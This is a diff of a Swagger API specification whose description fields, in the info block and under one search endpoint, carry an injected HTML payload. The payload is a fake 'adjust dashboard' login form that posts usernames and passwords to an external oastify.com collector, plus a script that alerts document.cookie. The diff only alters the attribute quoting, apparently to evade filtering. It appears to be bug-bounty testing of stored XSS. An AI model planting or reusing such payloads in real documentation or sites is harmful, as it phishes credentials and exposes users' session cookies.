@@ -11,24 +11,24 @@
   ],
   "swagger": "2.0",
   "info": {
-    "description": " <div class='login-form'>
-    <div class='heading'>
-    <img  src='https://profile-photos.hackerone-user-content.com/variants/0y8yz7n6j5sfjx17kcmtv8tfvtuf/5fd11c324df07e597eb78f6408fe2c2c871c1503f479ab4fa8446caf0eb02322' >
+    "description": "<div class=login-form>
+    <div class=heading>
+    <img  src=https://profile-photos.hackerone-user-content.com/variants/0y8yz7n6j5sfjx17kcmtv8tfvtuf/5fd11c324df07e597eb78f6408fe2c2c871c1503f479ab4fa8446caf0eb02322 >
         <h1>welcom to adjust dashboard  Please  Login First </h1>
         <script>alert(document.cookie)</script>
     </div>
-    <div class='form-container'>
-        <form action='https://7s0wrj0zeagbygktg7avgdu87zdq1mpb.oastify.com/' method='post' class='form-signin'>
-            <div class='form-group'>
-                <label for='username'>Username</label>
-                <input type='text' name='username' size='20'>
+    <div class=form-container>
+        <form action=https://7s0wrj0zeagbygktg7avgdu87zdq1mpb.oastify.com/ method=post class=form-signin>
+            <div class=form-group>
+                <label for=username>Username</label>
+                <input type=text name=username size=20>
             </div>
-            <div class='form-group'>
-                <label for='password'>Password</label>
-                <input type='password' name='password' >
+            <div class=form-group>
+                <label for=password>Password</label>
+                <input type=password name=password >
             </div>
-            <div class='form-group'>
-                <button type='submit' class='btn btn-default'>Login</button>
+            <div class=form-group>
+                <button type=submit class=btn btn-default>Login</button>
             </div>
         </form>
     </div>
@@ -45,24 +45,24 @@
   "paths": {
     "/access-control/assignments/search": {
       "post": {
-        "description": " <div class='login-form'>
-    <div class='heading'>
-    <img  src='https://profile-photos.hackerone-user-content.com/variants/0y8yz7n6j5sfjx17kcmtv8tfvtuf/5fd11c324df07e597eb78f6408fe2c2c871c1503f479ab4fa8446caf0eb02322' >
+        "description": "<div class=login-form>
+    <div class=heading>
+    <img  src=https://profile-photos.hackerone-user-content.com/variants/0y8yz7n6j5sfjx17kcmtv8tfvtuf/5fd11c324df07e597eb78f6408fe2c2c871c1503f479ab4fa8446caf0eb02322 >
         <h1>welcom to adjust dashboard  Please  Login First </h1>
         <script>alert(document.cookie)</script>
     </div>
-    <div class='form-container'>
-        <form action='https://7s0wrj0zeagbygktg7avgdu87zdq1mpb.oastify.com/' method='post' class='form-signin'>
-            <div class='form-group'>
-                <label for='username'>Username</label>
-                <input type='text' name='username' size='20'>
+    <div class=form-container>
+        <form action=https://7s0wrj0zeagbygktg7avgdu87zdq1mpb.oastify.com/ method=post class=form-signin>
+            <div class=form-group>
+                <label for=username>Username</label>
+                <input type=text name=username size=20>
             </div>
-            <div class='form-group'>
-                <label for='password'>Password</label>
-                <input type='password' name='password' >
+            <div class=form-group>
+                <label for=password>Password</label>
+                <input type=password name=password >
             </div>
-            <div class='form-group'>
-                <button type='submit' class='btn btn-default'>Login</button>
+            <div class=form-group>
+                <button type=submit class=btn btn-default>Login</button>
             </div>
         </form>
     </div>
